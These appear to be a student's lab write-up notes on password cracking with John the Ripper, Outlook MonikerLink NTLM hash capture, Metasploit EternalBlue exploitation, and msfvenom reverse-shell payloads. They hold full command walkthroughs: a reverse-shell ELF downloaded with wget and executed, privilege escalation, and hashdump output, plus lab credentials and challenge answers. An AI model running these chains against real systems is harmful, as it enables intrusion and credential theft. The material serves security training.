# John the Ripper (JtR) ENG ver.
## 1. John the Ripper (JtR)

### 1.1 Core Concepts

**John the Ripper (JtR)** is one of the most popular password cracking tools. Its primary function is to take a "hash" (the encrypted representation of a password) and compare it against a wordlist or use incremental (brute-force) methods to find the original "plaintext" password.

- **Modes of Operation:**
    
    1. **Single Crack:** Uses information from the hash itself (like the username) to guess passwords.
        
    2. **Wordlist:** (Most common) Uses a dictionary file (e.g., `rockyou.txt`) to test each word.
        
    3. **Incremental (Brute-force):** Tries every possible character combination (`aaa`, `aab`, `aac`). It's slow but exhaustive.
        
- **Utilities (`*2john`):** JtR cannot read encrypted files directly. It requires helper utilities to "extract" the hash from these files, such as `zip2john`, `rar2john`, and `ssh2john`.
    

### 1.2 The Problem

We discovered an SSH Private Key (`id_rsa`) that was encrypted with a passphrase. We could not use this key to authenticate until we cracked that passphrase.

### 1.3 Commands & Techniques

Bash

```
# 1. Use ssh2john to extract the hash from the id_rsa file
ssh2john id_rsa > ssh_hash.txt

# 2. Use John (JtR) with a wordlist (rockyou.txt) to crack the hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt

# 3. (If successful) Show the cracked password
john --show ssh_hash.txt
```

---

## 2. Reconnaissance & Initial Exploitation (CVE-2024-21413 - MonikerLink)

### 2.1 Core Concepts

This is a vulnerability in **Microsoft Outlook** that allows an attacker to "bypass" the **Protected View** security feature.

- **Mechanism:** The attacker crafts a malicious link in an email starting with `file://`.
    
- **The Trick:** They append a special character `!` to the end of the link (e.g., `file://[IP]/share!exploit`).
    
- **Impact:** When the victim clicks, Outlook bypasses its security prompt and attempts to authenticate with the attacker's server (SMB). This causes the victim's **NTLMv2 Hash** (their password's fingerprint) to be leaked.
    
- **Catcher Tool:** We use `Responder`, a tool that acts as a fake SMB server to "catch" the leaked hash.
    

### 2.2 The Problem

Simulate the attack by setting up `Responder` to listen and sending a phishing email with the malicious `file://...` link to the target to capture their NTLMv2 Hash.

### 2.3 Commands & Techniques

Bash

```
# 1. (On Attacker) Find our network interface (e.g., tun0 or ens5)
ip a

# 2. (On Attacker) Run Responder to capture the hash
# Must use sudo and specify the correct interface with -I
sudo responder -I tun0

# 3. (On Attacker) Run the Python (PoC) script to send the malicious email
# (The IP in the script must be changed to our IP first)
python3 exploit.py

# 4. (On Victim) Click the link in the email

# 5. (On Attacker) Check the Responder window
# We will see the victim's NTLMv2 Hash appear
```

---

## 3. Metasploit Framework

### 3.1 Core Concepts

**Metasploit** is the largest and most comprehensive framework for penetration testing. It bundles exploits, payloads, and other tools into a single platform.

- **`msfconsole`:** The primary command center interface.
    
- **Context:** The most critical concept (`msf6 >` is the global prompt; `msf6 exploit(...) >` means you are inside a specific module's context).
    
- **Modules:**
    
    - **Exploit:** Code that leverages a vulnerability (e.g., `ms17_010_eternalblue`).
        
    - **Auxiliary:** Helper tools (e.g., `scanner/smb/smb_version`).
        
    - **Post:** Tools used _after_ exploitation (e.g., `shell_to_meterpreter`, `hashdump`).
        
- **Payloads (What you send):**
    
    - **Reverse Shell:** (Most common) The victim connects "back" to you (Requires `LHOST` - your IP).
        
    - **Bind Shell:** The victim "opens" a port and waits for you to connect (Requires `RPORT`).
        
- **Meterpreter:** This is Metasploit's "god-mode" payload. It's not just a shell, but a powerful agent with advanced functions (e.g., `getsystem`, `hashdump`, `download`).
    
- **Database:** Metasploit can connect to a database (PostgreSQL) to "save" all scan results, manage `Workspaces` (projects), and use `db_nmap` to scan and auto-import.
    

### 3.2 The Problem

This was a complex, multi-stage problem:

1. **Scan:** Use the Metasploit Database and Nmap to enumerate the target.
    
2. **Exploit:** Use `ms17_010_eternalblue` to exploit the target (`10.10.98.199`).
    
3. **Roadblock:** The initial shell (`Session 1`) had insufficient privileges (`reg save` failed).
    
4. **Upgrade:** We needed to "upgrade" the basic shell into a Meterpreter session.
    
5. **PrivEsc:** Once in Meterpreter (`Session 2`), use `getsystem` to gain full system privileges.
    
6. **Loot:** Use `hashdump` to extract the NTLM hash for the user `pirate`.
    

### 3.3 Commands & Techniques

#### Database Setup

Bash

```
# (One-time setup in Kali) Start the database
sudo systemctl start postgresql

# (One-time setup in Kali) Initialize the Metasploit database
sudo msfdb init

# (In msfconsole) Check status
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.

# Create and switch to a new project workspace
msf6 > workspace -a THM_Project
```

#### Scanning

Bash

```
# Use db_nmap to scan and auto-import results into the DB
msf6 > db_nmap -sV -p- 10.10.98.199

# View all hosts in the project
msf6 > hosts

# View all services/ports
msf6 > services
```

#### Exploitation

Bash

```
# Search for and select the exploit
msf6 > search ms17-010
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Set the target (victim)
msf6 exploit(...) > set RHOSTS 10.10.98.199

# Set the payload (if a Reverse Shell is desired)
msf6 exploit(...) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 10.4.10.128

# Fire!
msf6 exploit(...) > exploit
...
C:\Windows\system32>
```

#### Session Management (Crucial!)

Bash

```
# "Background" the current shell (Session 1) to return to msfconsole
C:\Windows\system32> ^Z  (Press Ctrl + Z)
Background session 1? [y/N]  y

# List all active sessions
msf6 exploit(...) > sessions -l

  Id  Name  Type               Information
  --  ----  ----               -----------
  1         shell x64/windows  Shell Banner: ...

# "Interact" with a session to go back into it
msf6 exploit(...) > sessions -i 1
[*] Starting interaction with 1...
C:\Windows\system32>
```

#### Upgrading & Privilege Escalation

Bash

```
# (After backgrounding Session 1)
# Use the shell upgrade module
msf6 exploit(...) > use post/multi/manage/shell_to_meterpreter

# Tell the module which session to upgrade
msf6 post(...) > set SESSION 1

# Set LHOST/LPORT again for the new Meterpreter callback
msf6 post(...) > set LHOST 10.4.10.128
msf6 post(...) > set LPORT 4434

# Run the upgrade
msf6 post(...) > run
[*] Sending stage...
[*] Meterpreter session 2 opened...

# Interact with the new Session 2 (Meterpreter)
msf6 post(...) > sessions -i 2
meterpreter > 

# Escalate to SYSTEM privileges
meterpreter > getsystem
...got system...

# Dump all hashes!
meterpreter > hashdump
Administrator:500:aad3...:31d6...
pirate:1001:aad3...:8ce9a3ebd1647fcc5e04025019f4b875:::

# Answer found (NTLM Hash for pirate)
# 8ce9a3ebd1647fcc5e04025019f4b875
```
## 4. Msfvenom and Exploit Handler

### 4.1 Core Concepts

**Msfvenom** is a tool within the Metasploit Framework used to generate **standalone payloads**.

Its primary function is to create malicious files (e.g., `.exe`, `.php`, `.elf`) that, when executed by a victim, will connect back to the attacker, providing a shell or Meterpreter session.

**Exploit Handler (`exploit/multi/handler`)** Since `Msfvenom` only _creates_ the payload file, it does not _listen_ for the connection. We must use the `exploit/multi/handler` in `msfconsole` to act as the "listener" or "catcher."

> **The Golden Rule:** The `PAYLOAD`, `LHOST`, and `LPORT` settings in the handler **must perfectly match** the settings used to generate the payload with `Msfvenom`.

### 4.2 The Problem

This was a complex, multi-stage problem that simulates a manual exploitation chain:

1. **Generate Payload:** Create an `.elf` file (for Linux) that contains a Meterpreter reverse shell.
    
2. **Set Listener:** Open `msfconsole` and configure the `exploit/multi/handler` to wait for the connection.
    
3. **Transfer File:** Move the generated `.elf` file from the attacker machine to the victim machine.
    
4. **Execute:** Run the `.elf` file on the victim machine to make it connect back.
    
5. **Dump Hashes:** Once the Meterpreter session is established, use a post-exploitation module (`post/linux/gather/hashdump`) to dump the password hashes of other users on the system.
    

### 4.3 Commands & Techniques (The Full Walkthrough)

Here is the complete step-by-step process (separated by terminal windows) that you performed to solve this challenge.

#### Terminal 1: (Attacker Machine) - Generate Payload

Bash

```
# 1. Find our attacker IP (LHOST)
# (We assume our IP is 10.4.10.128)
ip a

# 2. Create the .elf payload with Msfvenom
# -p = Payload to use
# LHOST = Our attacker IP
# LPORT = The port we will listen on
# -f = Format (elf is the executable for Linux)
# -o = Output (the file name to save as)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.4.10.128 LPORT=4444 -f elf -o shell.elf

# Result:
# [-] No platform was selected...
# [-] No arch selected...
# Payload size: 130 bytes
# Final size of elf file: 250 bytes
# Saved as: shell.elf
```

#### Terminal 2: (Attacker Machine) - Set up Handler

Bash

```
# 1. Start the Metasploit Console
msfconsole -q

# 2. Use the multi-handler module
msf6 > use exploit/multi/handler

# 3. Set the payload (MUST match Msfvenom)
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp

# 4. Set LHOST (MUST match)
msf6 exploit(multi/handler) > set LHOST 10.4.10.128

# 5. Set LPORT (MUST match)
msf6 exploit(multi/handler) > set LPORT 4444

# 6. "run" (Metasploit will now wait for a connection)
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.4.10.128:4444
```

#### Terminal 3: (Attacker Machine) - Web Server (for File Transfer)

Bash

```
# 1. Navigate to the folder containing shell.elf
# (Must be a new terminal; do not close Terminals 1 or 2)

# 2. Start a simple web server on port 9000
python3 -m http.server 9000
```

#### Terminal 4: (Victim Machine) - Download & Execute

Bash

```
# 1. Log in to the victim machine (murphy / 1q2w3e4r) and escalate privileges
sudo su

# 2. Navigate to a writable directory (like /tmp)
cd /tmp

# 3. Download the .elf payload from our attacker machine
wget http://10.4.10.128:9000/shell.elf

# 4. Give the file execute permissions
chmod +x shell.elf

# 5. Execute the payload!
./shell.elf
```

#### Back to Terminal 2: (Attacker Machine) - Session Received!

Bash

```
# (This window will update as soon as the victim runs the file)
[*] Started reverse TCP handler on 10.4.10.128:4444
[*] Meterpreter session 1 opened (10.4.10.128:4444 -> 10.10.139.146:...)
meterpreter > 
```

#### Post-Exploitation (Dumping the Hashes)

Bash

```
# 1. "Background" the Meterpreter session to return to msfconsole
meterpreter > background
[*] Backgrounding session 1...

# 2. Use the Linux hashdump module
msf6 exploit(multi/handler) > use post/linux/gather/hashdump

# 3. Tell the module WHICH session to run on
msf6 post(linux/gather/hashdump) > set SESSION 1
SESSION => 1

# 4. Run the module
msf6 post(linux/gather/hashdump) > run

# 5. Get the hashes for all users
[+] murphy:$6$qK0Kt4UO$HuCr...
[+] claire:$6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0:1002...
[*] Post module execution completed

# 6. Copy the hash for the "other user" (claire) as the answer
# Answer: $6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0
```
